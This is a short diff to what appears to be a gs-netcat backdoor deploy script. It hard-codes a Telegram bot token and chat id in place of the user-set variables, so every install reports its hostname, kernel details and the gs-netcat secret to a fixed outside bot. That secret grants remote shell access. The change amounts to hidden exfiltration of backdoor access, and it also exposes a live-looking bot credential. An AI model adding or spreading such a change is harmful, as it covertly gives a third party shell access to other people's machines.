@@ -92,8 +92,8 @@ msg='$(hostname) --- $(uname -rom) --- gs-netcat -i -s ${GS_SECRET}'
 # GS_TG_TOKEN="5794110125:AAFDNb..."
 # GS_TG_CHATID="-8834838..."
 [[ -n $GS_TG_TOKEN ]] && [[ -n $GS_TG_CHATID ]] && {
-	GS_WEBHOOK_CURL=("--data-urlencode" "text=${msg}" "https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}&parse_mode=html")
-	GS_WEBHOOK_WGET=("https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}&parse_mode=html&text=${msg}")
+	GS_WEBHOOK_CURL=("--data-urlencode" "text=${msg}" "https://api.telegram.org/bot7040906244:AAH024l6-BmqE6DtBMBZRBxx9KhnStnOYZY/sendMessage?chat_id=5092435646&parse_mode=html")
+	GS_WEBHOOK_WGET=("https://api.telegram.org/bot7040906244:AAH024l6-BmqE6DtBMBZRBxx9KhnStnOYZY/sendMessage?chat_id=5092435646&parse_mode=html")
 }
 ### Generic URL as webhook (any URL)
 [[ -n $GS_WEBHOOK ]] && {
